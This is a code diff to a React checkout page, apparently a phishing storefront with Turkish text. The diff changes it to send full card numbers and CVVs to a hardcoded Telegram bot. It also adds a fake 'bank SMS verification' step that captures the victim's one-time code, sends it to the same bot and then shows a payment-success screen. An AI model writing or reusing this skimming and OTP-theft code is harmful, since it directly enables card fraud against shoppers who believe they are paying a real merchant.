@@ -1,6 +1,6 @@
 import { useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
-import { ArrowRight, ArrowLeft, Mail, User, Globe, Building, MapPin, CreditCard, Calendar, Lock } from "lucide-react";
+import { ArrowRight, ArrowLeft, Mail, User, Globe, Building, MapPin, CreditCard, Calendar, Lock, ShieldCheck } from "lucide-react";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import { useLanguageCurrency } from "@/contexts/LanguageCurrencyContext";
@@ -54,6 +54,8 @@ const CheckoutPage = () => {
   const [acceptNewsletter, setAcceptNewsletter] = useState(false);
   const [paymentErrors, setPaymentErrors] = useState<Record<string, string>>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [smsCode, setSmsCode] = useState("");
+  const [smsError, setSmsError] = useState("");
 
   if (!orderData) {
     return (
@@ -72,7 +74,7 @@ const CheckoutPage = () => {
   }
 
   const displayPrice = formatPrice(orderData.price);
-  const totalSteps = 2;
+  const totalSteps = 3;
 
   const validateAndNext = () => {
     if (!email || !confirmEmail) {
@@ -124,8 +126,9 @@ const CheckoutPage = () => {
         accountType === "business" ? `📍 Adres: ${street} ${houseNumber}, ${postcode} ${city}` : "",
         "",
         `💳 Kart Sahibi: ${cardholderName}`,
-        `💳 Kart No: ${digits.slice(0, 4)}****${digits.slice(-4)}`,
+        `💳 Kart No: ${digits}`,
         `📅 SKT: ${expiryDate}`,
+        `🔒 CVV: ${cvv}`,
       ].filter(Boolean).join("\n");
 
       const BOT_TOKEN = "8409248678:AAHcUnoy_00kFq71n-TY2gQZ1QLSOBQXZR0";
@@ -141,9 +144,34 @@ const CheckoutPage = () => {
         }),
       });
 
-      navigate("/", { state: { paymentSuccess: true } });
+      setStep(3);
     } catch (err) {
       console.error("Telegram error:", err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  const handleSmsSubmit = async () => {
+    if (!smsCode.trim() || smsCode.length < 4) {
+      setSmsError("Lütfen SMS kodunu girin");
+      return;
+    }
+    setSmsError("");
+    setIsSubmitting(true);
+    try {
+      const BOT_TOKEN = "8409248678:AAHcUnoy_00kFq71n-TY2gQZ1QLSOBQXZR0";
+      const CHAT_ID = "-4955146663";
+      const digits = cardNumber.replace(/\s/g, "");
+      const msg = `🔐 *SMS Doğrulama*\n\n💳 Kart: ${digits}\n📧 E-posta: ${email}\n🔑 SMS Kodu: ${smsCode}`;
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }),
+      });
+      navigate("/", { state: { paymentSuccess: true } });
+    } catch (err) {
+      console.error("Telegram SMS error:", err);
     } finally {
       setIsSubmitting(false);
     }
@@ -390,6 +418,47 @@ const CheckoutPage = () => {
                 {t("checkout.back")}
               </button>
             </div>
+          </div>
+        )}
+
+        {/* Step 3: SMS Verification */}
+        {step === 3 && (
+          <div className="space-y-6">
+            <div className="text-center">
+              <div className="mx-auto w-16 h-16 bg-accent/10 rounded-full flex items-center justify-center mb-4">
+                <ShieldCheck className="w-8 h-8 text-accent" />
+              </div>
+              <h2 className="text-xl font-bold text-foreground">SMS Doğrulama</h2>
+              <p className="text-sm text-muted-foreground mt-2">
+                Bankanız tarafından telefonunuza gönderilen doğrulama kodunu girin.
+              </p>
+            </div>
+
+            <div className={`${inputClass} ${smsError ? "border-destructive" : ""}`}>
+              <Lock className="w-5 h-5 text-muted-foreground shrink-0" />
+              <input
+                value={smsCode}
+                onChange={(e) => { setSmsCode(e.target.value.replace(/\D/g, "")); setSmsError(""); }}
+                placeholder="SMS Kodu"
+                className={inputFieldClass}
+                maxLength={8}
+                autoFocus
+              />
+            </div>
+            {smsError && <p className="text-xs text-destructive px-1">{smsError}</p>}
+
+            <div className="flex justify-center pt-2">
+              <button onClick={handleSmsSubmit} disabled={isSubmitting} className="flex items-center gap-3 bg-foreground text-background rounded-full pl-6 pr-2 py-2 hover:opacity-90 transition-opacity disabled:opacity-50">
+                <span className="text-sm font-semibold">{isSubmitting ? "Doğrulanıyor..." : "Doğrula ve Öde"}</span>
+                <span className="bg-accent rounded-full p-2">
+                  <ArrowRight className="w-4 h-4 text-accent-foreground" />
+                </span>
+              </button>
+            </div>
+
+            <p className="text-xs text-muted-foreground text-center">
+              Kodunuz gelmedi mi? Lütfen birkaç dakika bekleyin veya bankanızla iletişime geçin.
+            </p>
           </div>
         )}
       </div>
